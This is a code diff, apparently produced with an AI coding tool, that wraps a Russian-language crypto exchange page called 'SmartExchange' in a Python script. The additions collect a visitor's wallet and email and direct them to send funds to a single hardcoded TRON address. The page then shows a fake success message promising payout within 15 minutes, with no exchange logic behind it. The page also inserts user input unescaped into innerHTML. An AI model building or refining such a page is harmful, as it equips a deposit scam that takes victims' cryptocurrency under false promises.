@@ -1,3 +1,7 @@
+from pathlib import Path
+
+# Создаём HTML с сохранением полного функционала и бегущей строки с курсами
+final_html = """
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -15,8 +19,7 @@
     }
 
     .ticker {
-      background-color: #000;
-      color: #00ffcc;
+      background-color: #111;
       padding: 10px;
       font-size: 16px;
       white-space: nowrap;
@@ -75,6 +78,75 @@
       font-weight: bold;
       box-shadow: 0 0 10px #0077ff;
     }
+
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 10;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.8);
+    }
+
+    .modal-content {
+      background-color: #222;
+      color: white;
+      margin: 15% auto;
+      padding: 20px;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .features {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin: 40px 20px;
+      gap: 20px;
+    }
+
+    .feature-box {
+      border: 2px solid orange;
+      border-radius: 15px;
+      padding: 20px;
+      background: #111;
+      width: 300px;
+      box-shadow: 0 0 10px orange;
+    }
+
+    .faq-section {
+      max-width: 700px;
+      margin: 50px auto;
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 20px;
+      border-radius: 15px;
+    }
+
+    .faq-section h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .faq-item {
+      margin-bottom: 10px;
+    }
+
+    .faq-item summary {
+      cursor: pointer;
+      font-weight: bold;
+      background-color: #222;
+      padding: 10px;
+      border-radius: 10px;
+    }
+
+    .faq-item p {
+      padding: 10px;
+    }
   </style>
 </head>
 <body>
@@ -87,7 +159,10 @@
     <h1>SmartExchange</h1>
     <label>Вы отдаёте:</label>
     <select id="from">
-      <option>USDT</option><option>BTC</option><option>ETH</option>
+      <option>USDT</option><option>BTC</option><option>ETH</option><option>XRP</option><option>SOL</option>
+      <option>BNB</option><option>ADA</option><option>AVAX</option><option>DOT</option><option>TRX</option>
+      <option>LINK</option><option>MATIC</option><option>TON</option><option>LTC</option><option>SHIB</option>
+      <option>WBTC</option><option>ICP</option><option>UNI</option><option>BCH</option><option>XLM</option>
     </select>
 
     <label>Сколько:</label>
@@ -95,7 +170,10 @@
 
     <label>Вы получаете:</label>
     <select id="to">
-      <option>USDT</option><option>BTC</option><option>ETH</option>
+      <option>USDT</option><option>BTC</option><option>ETH</option><option>XRP</option><option>SOL</option>
+      <option>BNB</option><option>ADA</option><option>AVAX</option><option>DOT</option><option>TRX</option>
+      <option>LINK</option><option>MATIC</option><option>TON</option><option>LTC</option><option>SHIB</option>
+      <option>WBTC</option><option>ICP</option><option>UNI</option><option>BCH</option><option>XLM</option>
     </select>
 
     <button onclick="calculate()">Рассчитать</button>
@@ -112,12 +190,29 @@
 
   <a class="support" href="https://t.me/SmartExchangeSup" target="_blank">Support</a>
 
+  <div id="confirmModal" class="modal">
+    <div class="modal-content">
+      <p><b>Номер заявки:</b> <span id="orderId"></span></p>
+      <p><b>Подтвердите обмен:</b></p>
+      <p id="exchangeDetails"></p>
+      <p><b>Отправьте средства на:</b></p>
+      <p style="word-break: break-all;">TU9bqAtsMzcB3PW6cg1hF4j2gFdVV8sRD9</p>
+      <button onclick="confirmExchange()">Совершить обмен</button>
+    </div>
+  </div>
+
+  <div id="successModal" class="modal">
+    <div class="modal-content">
+      <p>Заявка на обмен успешна ✅</p>
+      <p>Ожидайте начисление в течение 15 минут.</p>
+    </div>
+  </div>
+
   <script>
     const rates = {
       "USDT->BTC": 0.0000094, "BTC->USDT": 105655.77,
       "USDT->ETH": 0.00037, "ETH->USDT": 2640.33
     };
-
     let latestResult = 0;
 
     function calculate() {
@@ -136,13 +231,37 @@
     }
 
     function showConfirm() {
+      const from = document.getElementById("from").value;
+      const to = document.getElementById("to").value;
+      const amount = document.getElementById("amount").value;
       const wallet = document.getElementById("userWallet").value;
       const email = document.getElementById("userEmail").value;
-      if (!wallet || !email) {
-        alert("Введите кошелёк и почту!");
-      } else {
-        alert("Обмен подтверждён. Ожидайте перевод.");
+
+      if (!amount || !wallet || !email) {
+        alert("Введите сумму, кошелёк и почту!");
+        return;
       }
+
+      const orderId = Math.floor(100000 + Math.random() * 900000);
+      document.getElementById("orderId").innerText = orderId;
+
+      const details = `
+        Вы отдаёте: ${amount} ${from},<br>
+        Получаете: ${latestResult.toFixed(6)} ${to}<br>
+        Кошелёк: ${wallet}<br>
+        Почта: ${email}
+      `;
+
+      document.getElementById("exchangeDetails").innerHTML = details;
+      document.getElementById("confirmModal").style.display = "block";
+    }
+
+    function confirmExchange() {
+      document.getElementById("confirmModal").style.display = "none";
+      document.getElementById("successModal").style.display = "block";
+      setTimeout(() => {
+        document.getElementById("successModal").style.display = "none";
+      }, 5000);
     }
 
     async function loadTicker() {
@@ -156,7 +275,19 @@
       }
     }
 
+    window.onclick = function(event) {
+      if (event.target.classList.contains('modal')) {
+        document.getElementById("confirmModal").style.display = "none";
+        document.getElementById("successModal").style.display = "none";
+      }
+    };
+
     loadTicker();
   </script>
 </body>
 </html>
+"""
+
+file_path = Path("/mnt/data/smartexchange_with_ticker.html")
+file_path.write_text(final_html, encoding="utf-8")
+file_path.name
